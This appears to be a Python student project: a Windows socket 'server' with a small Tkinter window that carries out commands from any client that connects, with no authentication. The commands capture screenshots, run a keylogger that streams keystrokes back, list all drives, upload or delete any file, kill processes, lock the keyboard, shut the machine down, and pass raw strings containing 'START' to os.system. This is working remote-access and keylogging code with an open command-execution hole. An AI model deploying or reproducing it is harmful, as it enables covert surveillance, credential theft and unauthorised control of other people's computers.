from tkinter import ttk
from tkinter import *
import threading
import socket
import os
import pyautogui
import platform
from winreg import *
from time import sleep
import subprocess
import json
import keyboard #pip install keyboard
import csv
import codecs
import sys
import time
class Server(object):
    def main_form(self):
        """Creates the interface window"""
        self.root = Tk()
        self.root.title("Server")

        #mainframe
        self.mainframe = ttk.Frame(self.root, padding="25 25 50 50")
        self.mainframe.grid(column=0, row=0, sticky=(N,W,E,S))
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        
        self.root.geometry("640x360")

        #Open server button
        self.connectButton = ttk.Button(self.mainframe, text='Open', command=self.threadConnect)
        self.connectButton.grid(column=1, row=1)

        self.mainframe.columnconfigure(1, weight=1)
        self.mainframe.rowconfigure(1, weight=1)

        self.root.mainloop()
        pass
    def threadConnect(self):
        con=threading.Thread(target=self.Connect)
        con.start()
    def Connect(self):
        port = 1025
        #addr = '14.230.23.93'
        addr = socket.gethostbyname(socket.gethostname())
        Label(self.mainframe,text=addr+':'+str(port)).grid(column=1,row=2)
        print(addr, port)
        self.connectButton['text'] = 'Close'
        self.connectButton['command'] = self.Close
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind((addr, port))
        s.listen()
        while True:
            self.conn, self.target_addr = s.accept()
            data=self.conn.recv(1024)
            print(data)
            if not data:
                break
            self.magicFunction(data)
    #Ham nay nhan lenh tu client
    def magicFunction(self,Str:bytes):
        if Str.decode()=='Hello':
            print('Hello')
        elif Str.decode().find('LOCKKEYBOARD') != -1:
            tmp = Str.decode().split(' ')
            for i in range(180):
                keyboard.block_key(i)
            time.sleep(int(tmp[1]))
            for i in range(180):
                keyboard.unblock_key(i)
        elif Str.decode().find('LOGOUT')!=-1:
            os.system('shutdown -l')
        elif Str.decode().find('SHUTDOWN')!=-1:
            #Commands the server to shut down
            try:
                a = Str.decode().split()
                cmd = Str.decode()
                if len(a) == 2:
                    cmd='shutdown -s -t ' + a[1]
                else:
                    cmd='shutdown -s'
                os.system(cmd)
            except Exception as e:
                self.conn.send("Invalid command: " + str(e))
        elif Str.decode() == 'CAPSCR':
            pyautogui.screenshot().save('scr.png')
            send = open('scr.png','rb')
            while True:
                data=send.read(1024)
                if not data:
                    break
                self.conn.sendall(data)
        
        elif Str.decode() == 'SHWPRC':
            #Commands the server to send the file consisting of running processes
            os.system('wmic /output:list.txt process get Name, ProcessId, ThreadCount /format:csv')
            csv_reader = csv.reader(codecs.open('list.txt','rU','utf-16'))
            for row in csv_reader:
                if len(row) == 0 or 'Name' in str(row):
                    continue
                data = "{},{},{}\n".format(row[1],row[2],row[3])
                self.conn.sendall(data.encode())
            self.conn.send('STOPRIGHTNOW'.encode())
            
        elif Str.decode() == 'SHWPRCAPP':
            tmp = subprocess.check_output("powershell gps | where {$_.MainWindowTitle} | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}")
            arr = tmp.decode('utf-8').split()[6:]
            print(arr)
            for i in range(0,len(arr)//3):
                plusStr=str(arr[3*i]+' '+arr[3*i+1]+' '+arr[3*i+2]+' ')
                self.conn.send(plusStr.encode())
            self.conn.send('STOPRIGHTNOW'.encode())
        elif Str.decode().find('KILLAPP') != -1:
            name = str(Str.decode().split()[1])
            try:
                subprocess.check_output('powershell Stop-Process -ID '+ name +' -Force')            
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode().find('KILL') != -1:
            PID = int(Str.decode().split()[1])
            try:
                os.kill(PID, 9)
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode().find('START') != -1:
            try:
                os.system(Str.decode())
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode() == 'KEYLOG':
            bep = threading.Thread(target=self.startKeylogging)
            bep.start()
        elif Str.decode() == 'KEYSTOP':
            self.stopKeylogging()

        elif Str.decode() == 'DIRSHW':
            if platform.system() == "Windows":
                possible_names = [chr(i) + ":\\" for i in range(ord("A"), ord("Z") + 1)]
                partitions = {}
                for name in possible_names:
                    if os.path.isdir(name):
                        partitions[name] = self.list_files(name)
                data = json.dumps(partitions)
                self.conn.sendall(data.encode())
            else:
                pass
        
        elif Str.decode().find('GIVE') == 0:
            arg = Str.decode().split()[1]
            with open(arg, 'rb') as ifile:
                while True:
                    data = ifile.read(1024)
                    if not data:
                        break
                    self.conn.sendall(data)
        elif Str.decode().find('BANISH') == 0:
            arg = Str.decode().split()[1]
            try:
                os.remove(arg)
            except NotImplementedError:
                pass
            if platform.system() == "Windows":
                possible_names = [chr(i) + ":\\" for i in range(ord("A"), ord("Z") + 1)]
                partitions = {}
                for name in possible_names:
                    if os.path.isdir(name):
                        partitions[name] = self.list_files(name)
                data = json.dumps(partitions)
                self.conn.sendall(data.encode())
            else:
                pass


    def list_files(self, partition):
        ret = []
        for root, dirs, files in os.walk(partition):
            level = root.replace(partition, '').count(os.sep)
            indent = '\t' * (level)
            ret.append('{}{}/'.format(indent, os.path.basename(root)))
            subindent = '\t' * (level + 1)
            for f in files:
                ret.append('{}{}'.format(subindent, f))
        return ret

                

    #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
    __interval = 5
    __log = ''
    __noch = 0
    def __callback(self, event):
        name = event.name
        if len(name) > 1:
                if name == 'space':
                    name = ' '
                elif name == 'enter':
                    name = '[ENTER]\n'
                elif name == 'decimal':
                    name = '.'
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
        self.__log += name
    def __report(self):
        if self.__log:
            self.conn.send(self.__log[self.__noch:].encode())
            self.__noch = len(self.__log)
        timer = threading.Timer(interval=self.__interval, function=self.__report)
        timer.daemon = True
        timer.start()
    def startKeylogging(self):
        keyboard.on_release(self.__callback)
        self.__report()
        keyboard.wait()
    #TODO: Unhook
    def stopKeylogging(self):
        keyboard.unhook(self.__callback)
    def Close(self):
        s.close()
        close_it=threading.Thread(target=self.root.destroy,daemon=True)
        close_it.start()
ins=Server()
mainz=threading.Thread(target=ins.main_form)
try:
    mainz.start()
except:
    ins.Connect()
    pass
